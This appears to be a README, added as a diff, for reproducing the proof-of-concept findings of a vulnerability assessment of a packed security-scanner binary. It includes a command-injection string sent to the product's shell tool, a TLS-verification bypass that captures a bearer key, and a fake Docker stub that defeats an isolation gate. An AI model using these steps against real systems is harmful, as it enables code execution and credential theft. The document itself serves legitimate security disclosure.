@@ -1,0 +1,432 @@
+# Running the PoCs
+
+These scripts reproduce the findings in `../signal-pyarmor-linux-x86_64-vapt.md`
+against `signal-pyarmor-linux-x86_64` (Black Duck Signal 2026.9.0).
+
+Every command and every "expected output" below was executed end-to-end from a
+clean directory while writing this file. `$WORK` is a scratch directory of your
+choosing (`/tmp/vapt` was used for the assessment); nothing is hard-coded to it
+except the default paths noted in the table in step 6.
+
+There are **two kinds of script** and they need different interpreters:
+
+| Kind | Interpreter | Why |
+|---|---|---|
+| Reads the extracted artefact only | your system `python3` | `poc/11`, `12`, `13`, `07`, `01` |
+| Imports the frozen 3.13 modules | `./py313host` (built in step 5) | the frozen `.pyc` files are CPython 3.13 bytecode and must run on the `libpython3.13` shipped inside the binary |
+
+---
+
+## 0. Prerequisites
+
+```bash
+sudo apt-get install -y git python3 python3-venv gcc libc6-dev openssl   # Debian/Ubuntu
+```
+
+About 1.5 GB of free disk: the binary is 116 MB, the extraction 460 MB, and the
+merged tree is symlinks (almost free).
+
+## 1. Obtain the target and verify it
+
+The binary is stored in this repository as two parts on the `binary-drop` branch
+and attached to release `v1.0`. Either source works.
+
+```bash
+export WORK=/tmp/vapt && mkdir -p "$WORK" && cd "$WORK"
+
+# (a) pull the two parts out of the repository
+#     the explicit refspec matters: a bare `git fetch origin binary-drop`
+#     leaves only FETCH_HEAD, not a tracking ref for `git show`
+git -C /path/to/VAPT fetch origin binary-drop:refs/remotes/origin/binary-drop
+git -C /path/to/VAPT show origin/binary-drop:signal-pyarmor-linux-x86_64.part-00 > part-00
+git -C /path/to/VAPT show origin/binary-drop:signal-pyarmor-linux-x86_64.part-01 > part-01
+
+# (b) or take the release asset, in which case skip the `cat` below
+# gh release download v1.0 --pattern signal-pyarmor-linux-x86_64
+
+cat part-00 part-01 > signal-pyarmor-linux-x86_64      # part-00 first
+chmod +x signal-pyarmor-linux-x86_64
+
+stat -c%s signal-pyarmor-linux-x86_64
+# 116823456
+sha256sum signal-pyarmor-linux-x86_64
+# 47b9fa7236a5be5ed37a9186d55a6a84b8d2ef65fd0ab9e2fa744b0641c7d915
+```
+
+**Stop here if the hash does not match** — every result below depends on it.
+
+## 2. Unpack the PyInstaller archive
+
+```bash
+python3 -m venv /tmp/venv/pyenv
+/tmp/venv/pyenv/bin/pip install pyinstxtractor-ng
+
+cd "$WORK"
+/tmp/venv/pyenv/bin/pyinstxtractor-ng signal-pyarmor-linux-x86_64
+```
+
+Takes a couple of seconds and yields `signal-pyarmor-linux-x86_64_extracted/`
+with **123 top-level entries** and **6,379 modules** under `PYZ.pyz_extracted/`.
+
+The archive is **not encrypted**, so no key is needed. Expect 17 warnings of the
+form `[!] Warning: Empty file PYZ.pyz_extracted/…pyc`: for each, the extractor
+writes a 16-byte header-only stub (`f3 0d 0d 0a` + 12 zero bytes) instead of the
+package. Those stubs are handled next.
+
+## 3. Repair the namespace-package markers
+
+`pyinstxtractor-ng` writes a header-only stub `.pyc` for every namespace
+package, *including* ones that also exist as a real directory. The stub shadows
+the package, so `import langgraph`, `import google`, `import opentelemetry` and
+friends fail. Delete the stub whenever a directory of the same name exists:
+
+```bash
+cd "$WORK"
+python3 - <<'EOF'
+import os
+root = "signal-pyarmor-linux-x86_64_extracted"
+removed = []
+for dirpath, dirnames, _files in os.walk(root):
+    for d in dirnames:
+        stub = os.path.join(dirpath, d + ".pyc")
+        if os.path.exists(stub) and os.path.getsize(stub) <= 32:
+            os.remove(stub)
+            removed.append(os.path.relpath(stub, root))
+print("removed %d namespace-package markers" % len(removed))
+for r in removed:
+    print("   ", r)
+EOF
+# removed 17 namespace-package markers
+```
+
+## 4. Build the merged import tree
+
+PyInstaller splits a package across two locations: extension modules (`.so`) stay
+at the CArchive root, pure-Python modules live in the extracted PYZ. Both halves
+must be visible under one directory or `numpy`, `faiss` and `tiktoken` cannot
+import. `poc/01` merges them **recursively**, writing only symlinks:
+
+```bash
+cd "$WORK"
+SIGNAL_EXTRACT="$WORK/signal-pyarmor-linux-x86_64_extracted" \
+MERGED_OUT="$WORK/merged" \
+python3 /path/to/VAPT/poc/01-build-merged-tree.py
+# merged entries at top level: 318
+```
+
+One level of merging is not enough — `numpy/_core` exists on both sides, and a
+non-recursive merge hides `numpy`'s extension modules.
+
+## 5. Build the reconstructed interpreter host
+
+```bash
+cd "$WORK"
+gcc -o py313host /path/to/VAPT/poc/02-rebuild-cpython-host.c -ldl
+```
+
+`py313host` `dlopen()`s the `libpython3.13.so.1.0` shipped inside the binary and
+runs a script with it, so product modules run on the interpreter they were built
+for. It defaults to
+`/tmp/vapt/signal-pyarmor-linux-x86_64_extracted/libpython3.13.so.1.0`; set
+`PY313_LIB` if your extraction is elsewhere.
+
+```bash
+mkdir -p "$WORK/pyhome"            # an empty PYTHONHOME keeps the host's stdlib out
+export PYTHONPATH="$WORK/merged:$WORK/signal-pyarmor-linux-x86_64_extracted/base_library.zip"
+export PYTHONHOME="$WORK/pyhome"
+export PYTHONIOENCODING=utf-8
+
+./py313host /path/to/VAPT/poc/08-collect-runtime-versions.py
+# python        : 3.13.5 (main, Jul 11 2025, 22:43:46) [Clang 20.1.4 ]
+# ssl           : OpenSSL 3.0.16 11 Feb 2025
+# zlib (module) : 1.3.1 | runtime: 1.3.1
+# numpy         : 2.3.5
+# faiss         : 1.12.0
+# tiktoken      : 0.12.0
+# certifi       : 2025.01.31
+```
+
+If that prints versions, the environment is good.
+
+> **Do not export `PYTHONHOME`/`PYTHONPATH` for the system `python3`** — it
+> aborts with `bad magic number in 'encodings'`. Set them only for `py313host`,
+> and run the system-Python scripts as
+> `env -u PYTHONHOME -u PYTHONPATH python3 …`. The `py3` alias below does that.
+
+---
+
+## 6. Run the PoCs
+
+```bash
+export WORK=/tmp/vapt
+export SIGNAL_EXTRACT="$WORK/signal-pyarmor-linux-x86_64_extracted"
+export POC=/path/to/VAPT/poc
+
+# for the py313host scripts only:
+export PYTHONPATH="$WORK/merged:$SIGNAL_EXTRACT/base_library.zip"
+export PYTHONHOME="$WORK/pyhome"
+
+# for the system-python scripts:
+alias py3='env -u PYTHONHOME -u PYTHONPATH python3'
+```
+
+### Static — no product code executed, no LLM endpoint needed
+
+| # | Command | Finding | Verified output |
+|---|---|---|---|
+| 09 | `./py313host $POC/09-check-advisory-ranges.py` | F-11, F-12 | `bundled components inside a published affected range: 6` |
+| 10 | `./py313host $POC/10-introspect-protected-module.py` | F-03 | docstrings, `classes: 22`, full signatures for a protected module |
+| 11 | `py3 $POC/11-analyse-pockit-endpoint.py` | F-15 | `POCKIT_LLM_BASE_URL`, `https://llm.labs.blackduck.com`, `ANTHROPIC_API_KEY` |
+| 12 | `py3 $POC/12-disassemble-pyc.py pockit/agents/shared_tools.pyc run_shell` | F-01 | the `run_shell` docstring, `120`, and `('shell', 'capture_output', 'text', 'timeout', 'cwd')` |
+
+`poc/11` resolves the extraction from `$SIGNAL_EXTRACT` (or
+`./signal-pyarmor-linux-x86_64_extracted`); `poc/12` resolves its argument under
+`$SIGNAL_EXTRACT/PYZ.pyz_extracted/`, so the line above works verbatim.
+
+### Dynamic — imports the shipped product code
+
+| # | Command (see the footnote below) | Finding | Verified output |
+|---|---|---|---|
+| 03 | `./py313host $POC/03-armored-module-survey.py` | F-03, F-14 | `62 / 62 imported`, `0 raised`, `3049 strings`, `4652 identifiers` — **with no licence file present** |
+| 04 | `./py313host $POC/04-protected-metadata-dump.py` | F-03 | `total harvested entries: 14344` → `$ANALYSIS_OUT/protected_harvest.tsv` (default `/tmp/vapt/analysis`, parent must exist) |
+| 05 | `./py313host $POC/05-poc-f01-host-shell.py` | **F-01** | `uid=1001(user) …`, hostname `e2b.local`, `[+] host file /tmp/pockit-poc-escape-proof created: True` |
+| 06 | `./py313host $POC/06-poc-f02-workspace.py --extract $SIGNAL_EXTRACT` | **F-02** | escaped workspace created from a traversing GUID; planted symlink adopted; fresh workspace mode `0o755` |
+
+These four run through `py313host`, so they need the
+`PYTHONHOME`/`PYTHONPATH` exports from §6.
+
+`poc/05` registers the shipped `run_shell` tool with `shell=True, write=True` and
+sends it `id; echo injected > /tmp/pockit-poc-escape-proof; cat /etc/hostname`.
+That is the whole finding — the command runs through
+`subprocess.run(..., shell=True)` in the scanning process's own namespace. It is
+safe to run, but read it first; the same code path is what an agent drives.
+
+### Dynamic — needs the real binary
+
+| # | Scenario | Finding |
+|---|---|---|
+| 07 | `--llm-ssl-verify false` against a self-signed endpoint | **F-06** |
+| 13 | What a scan actually sends to the LLM | **F-16** |
+| 15 | PoCKit's Docker gate, credential and endpoint | **F-15** |
+
+First, two things every scan needs — skipping either produces a confusing
+failure:
+
+```bash
+cd "$WORK"
+mkdir -p poc-target home
+printf 'def add(a, b):\n    return a + b\n' > poc-target/util.py
+
+# (1) the tokenizer cache (see "The tokenizer dependency" below)
+mkdir -p tkcache/cached
+cp <seeded-cache>/9b5ad71b2ce5302211f9c61530b329a4922fc6a4 tkcache/cached/
+
+# (2) a byo config. In byo mode the *per-agent* models are mandatory:
+#     `--llm-uri` alone exits 117 with "--llm-singlefilescan-agent-model is
+#     required in byo mode", once per agent.
+cat > poc-byo.signal <<'EOF'
+[LLM]
+mode = byo
+uri = http://127.0.0.1:8899/v1
+key = CANARY_KEY_123
+model = poc-model
+
+[LLM_SINGLEFILESCAN_AGENT]
+model = poc-model
+[LLM_DATAFLOW_AGENT]
+model = poc-model
+[LLM_OVERSIGHT_AGENT]
+model = poc-model
+[LLM_EXPLOITATION_AGENT]
+model = poc-model
+[LLM_SCA_AGENT]
+model = poc-model
+[LLM_MERGEKEY_EMBED_AGENT]
+model = poc-model
+[LLM_OVERSIGHT_EMBED_AGENT]
+model = poc-model
+EOF
+```
+
+**F-06 — `--llm-ssl-verify false` accepts an untrusted certificate.**
+
+```bash
+cd "$WORK"
+# the endpoint hard-codes these two filenames:
+openssl req -x509 -newkey rsa:2048 -nodes -days 2 \
+  -keyout poc-f06-selfsigned.key -out poc-f06-selfsigned.pem \
+  -subj "/CN=poc-f06-untrusted" -addext "subjectAltName=IP:127.0.0.1"
+
+# start this with a process manager or a second shell (see the note below)
+python3 $POC/07-poc-f06-tls-endpoint.py 8443 "$WORK/poc-f06-requests.log"
+
+# a config pointing at the HTTPS endpoint
+sed 's#http://127.0.0.1:8899/v1#https://127.0.0.1:8443/v1#' poc-byo.signal > poc-byo-tls.signal
+: > poc-f06-requests.log
+
+# verification ON -> refused, nothing reaches the endpoint
+HOME=$WORK/home ./signal-pyarmor-linux-x86_64 --config ./poc-byo-tls.signal \
+  --llm-ssl-verify true --llm-timeout 10 --check-llm-json true ./poc-target
+# exit 1 — "...summary": {"passed": 0, "failed": 7 …}; 5 chat agents report
+#          error_code 111, "Connection error."
+wc -l < poc-f06-requests.log     # 0
+
+# verification OFF -> the same endpoint is accepted, key and all
+HOME=$WORK/home TIKTOKEN_CACHE_DIR="$WORK/tkcache/cached" \
+  ./signal-pyarmor-linux-x86_64 --config ./poc-byo-tls.signal \
+  --llm-ssl-verify false --llm-timeout 10 --check-llm-json true ./poc-target
+# exit 1 — "summary": {"passed": 5, "failed": 2 …}, every chat agent "ok"
+wc -l < poc-f06-requests.log     # 7
+python3 -c "
+import json
+for i, l in enumerate(open('poc-f06-requests.log')):
+    d = json.loads(l); print(i, d['method'], d['path'], d['headers']['Authorization'])"
+# 0 POST /v1/chat/completions Bearer CANARY_KEY_123
+# …
+# 5 POST /v1/embeddings       Bearer CANARY_KEY_123
+# 6 POST /v1/embeddings       Bearer CANARY_KEY_123
+```
+
+Reading the numbers. In the first run all **seven** agents fail with
+`error_code 111, "Connection error."` — the certificate is refused, and nothing
+is logged. In the second run the five chat agents succeed and **all seven**
+agents' requests arrive at the endpoint, including the two embedding POSTs.
+Only five arrive if the tokenizer cache is missing, because the embedding agents
+then fail on the `cl100k_base` fetch (F-05) *before* dialling — so the count at
+the endpoint depends on F-05, not on the TLS setting. The `failed: 2` in the
+second run is also not a TLS result: this minimal PoC endpoint answers every path
+with a chat-completion body, which an embeddings client cannot parse, so those
+two report `error_code: 63` after their request has already been delivered and
+logged.
+
+`--check-llm-json` sends a small probe rather than source code, so the captured
+bodies are ~105 bytes; this PoC is about the *channel*. F-16 covers the payload.
+
+> **Don't background the listener with `&` inside a shell that then exits** — the
+> process outlives the shell, keeps the port, and a later start fails with
+> `Errno 98`. Use a process manager, `nohup` in a persistent session, or a second
+> terminal, and kill it when you are done.
+
+**F-16 — the scan sends source verbatim, credentials included.**
+
+```bash
+cd "$WORK"
+printf 'API_KEY = "AKIAIOSFODNN7EXAMPLE"\nDB_PASSWORD = "sup3r-s3cret-db-pass"\n' \
+  > poc-target/secret_sample.py
+
+python3 $POC/13-capture-llm-payload.py 8899 "$WORK/poc-f16-payload.log"   # second shell
+
+HOME=$WORK/home TIKTOKEN_CACHE_DIR="$WORK/tkcache/cached" \
+  ./signal-pyarmor-linux-x86_64 ./poc-target --config ./poc-byo.signal \
+  --llm-mode byo --llm-uri http://127.0.0.1:8899/v1 --llm-key CANARY_KEY_123 \
+  --agent-limit 1          # exit 0
+
+grep -c 'BODY (' poc-f16-payload.log                      # requests captured
+grep -c AKIAIOSFODNN7EXAMPLE poc-f16-payload.log           # non-zero
+grep -c 'Authorization: <redacted>' poc-f16-payload.log    # every request
+```
+
+Observed in the assessment's run: exit 0, **10 of 129** requests carried the
+planted literals. Repeating it from a clean directory with `--agent-limit 1`
+gave exit 0 and **2 of 27** — the counts scale with how much the run does, the
+finding does not. The prompt text is the point:
+
+```
+## SOURCE CODE
+```
+1: API_KEY = "AKIAIOSFODNN7EXAMPLE"
+2: DB_PASSWORD = "sup3r-s3cret-db-pass"
+```
+```
+
+The opposite asymmetry is worth checking too: the tool's **own** credential is
+redacted in its log (`--llm-key=********`), while the credential literals inside
+the analysed file are not.
+
+**F-15 — PoCKit's Docker "isolation" is a `PATH` lookup.**
+
+```bash
+cd "$WORK"
+command -v docker        # not installed in the assessment environment
+
+HOME=$WORK/home TIKTOKEN_CACHE_DIR="$WORK/tkcache/cached" \
+  ./signal-pyarmor-linux-x86_64 ./poc-target --config ./poc-byo.signal \
+  --poc-kit true --dataflow true --synthesis true --agent-limit 1
+# INFO : scans.sast  : Sending 0 exploitable_dataflow findings to PoCKit...
+# ERROR: utils.results: PoCKit requires Docker but the 'docker' binary was not
+#                      found. Install Docker and retry.
+
+printf '#!/bin/sh\necho "Docker version 27.0.0-stub"\n' > docker && chmod +x docker
+HOME=$WORK/home TIKTOKEN_CACHE_DIR="$WORK/tkcache/cached" PATH="$WORK:$PATH" \
+  ./signal-pyarmor-linux-x86_64 ./poc-target --config ./poc-byo.signal \
+  --poc-kit true --dataflow true --synthesis true --agent-limit 1
+# exit 0 — the gate is satisfied by three lines of shell
+```
+
+The gate is `shutil.which("docker")` plus a `docker info` call; it is not a
+capability check. The other two F-15 behaviours — the mandatory
+`ANTHROPIC_API_KEY` that none of the seven BYO credentials supply, and PoCKit
+taking its endpoint from the global `--llm-uri` (default
+`https://llm.core.blackduck.com/`) rather than the per-agent configuration —
+need an actual finding to hand to PoCKit, so they are driven through
+`--import-results` with a crafted SARIF. The exact commands and outputs are in
+**F-15's PoC block** in the report, and `poc/13` doubles as the capture endpoint
+for the PoCKit traffic (`POST /v1/messages`).
+
+---
+
+## The tokenizer dependency
+
+**This is F-05 and it blocks every scan.** Before its first model call, each
+embedding agent loads `cl100k_base` via `tiktoken`, which fetches
+`https://openaipublic.blob.core.windows.net/encodings/cl100k_base.tiktoken`
+unless a cache already holds it. In an egress-restricted environment — i.e. most
+security reviews — the fetch fails and the run reports `error_code 63` with that
+host in the message. No documented CLI option changes the location, so the only
+workarounds are an egress rule or a pre-seeded cache.
+
+tiktoken's cache is **hash-pinned**: the cached filename is `sha1(blob_url)` and
+the contents are verified against a compiled-in digest, so an empty or
+hand-written placeholder file does **not** satisfy it. Seed it on a host that has
+egress:
+
+```bash
+# either let tiktoken populate the cache itself
+mkdir -p tkcache/cached
+TIKTOKEN_CACHE_DIR=$PWD/tkcache/cached python3 -c "import tiktoken; tiktoken.get_encoding('cl100k_base')"
+
+# or download the blob and name it after the URL it belongs to
+curl -o tkcache/cached/9b5ad71b2ce5302211f9c61530b329a4922fc6a4 \
+  https://openaipublic.blob.core.windows.net/encodings/cl100k_base.tiktoken
+
+sha256sum tkcache/cached/*
+# 223921b76ee99bde995b7ff738513eef100fb51d18c93597a113bcffe865b2a7  …/9b5ad71b2ce5302211f9c61530b329a4922fc6a4
+```
+
+Copy `tkcache/` to the machine under test and point the run at
+`TIKTOKEN_CACHE_DIR="$WORK/tkcache/cached"`. If the tokenizer is unreachable and
+uncached, expect **zero** requests at your endpoint and `error_code: 63` — the
+tool fails closed, which is correct behaviour and also why the seeded cache is
+mandatory for the dynamic PoCs.
+
+---
+
+## Notes and caveats
+
+- **The extracted tree is a derived artefact** — keep it outside the repository.
+  Nothing in `poc/` writes into the extraction or into the binary.
+- **`poc/05` and `poc/06` execute shipped product code**, including a shell tool.
+  They run as you, on your machine. Read them before running them.
+- **Protected function bodies stay encrypted.** All 62 protected modules import
+  and yield 3,049 constants plus 4,652 identifiers (docstrings, class and method
+  names, signatures, prompt text), but `co_code` remains PyArmor-encrypted, so
+  do not expect source code from these scripts. `poc/12` reads the unprotected
+  `pockit/` bytecode, where full disassembly is possible.
+- **Advisory ranges drift.** `poc/09`'s ranges were correct on 2026-10-16;
+  re-check them against your advisory source before relying on the verdicts.
+- **`poc/09`, `10`, `03`, `04`, `05` and `06` need the repaired tree** from steps
+  2–4. If the extraction is stale or the markers were not removed, `poc/03` will
+  report import failures instead of `62/62`.
+- **The mock endpoints in `poc/07` and `poc/13` never forward anything** and bind
+  `0.0.0.0`; they are throwaway local listeners, so run them on a trusted network
+  or bind them to `127.0.0.1` in a shared environment.
